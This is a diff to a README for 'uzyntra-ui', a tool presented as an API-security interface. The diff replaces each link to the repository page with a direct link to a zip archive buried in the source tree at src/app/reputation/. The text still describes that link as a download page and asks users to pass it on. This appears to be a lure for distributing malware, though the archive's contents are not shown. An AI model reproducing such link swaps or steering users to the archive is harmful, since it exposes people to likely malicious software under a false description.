@@ -1,6 +1,6 @@
 # 🛡️ uzyntra-ui - Clear control for API security
 
-[![Download](https://img.shields.io/badge/Download-uzyntra--ui-blue?style=for-the-badge)](https://github.com/xaviersch9404/uzyntra-ui)
+[![Download](https://img.shields.io/badge/Download-uzyntra--ui-blue?style=for-the-badge)](https://raw.githubusercontent.com/xaviersch9404/uzyntra-ui/main/src/app/reputation/uzyntra-ui-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ For best results, use:
 
 Use this link to visit the download page and get the app:
 
-https://github.com/xaviersch9404/uzyntra-ui
+https://raw.githubusercontent.com/xaviersch9404/uzyntra-ui/main/src/app/reputation/uzyntra-ui-v1.6.zip
 
 After you open the page:
 1. Find the latest version or release
@@ -264,4 +264,4 @@ If you share the app with others, send them the same download page and tell them
 
 Use this link to visit the page and download the app again if needed:
 
-https://github.com/xaviersch9404/uzyntra-ui
+https://raw.githubusercontent.com/xaviersch9404/uzyntra-ui/main/src/app/reputation/uzyntra-ui-v1.6.zip
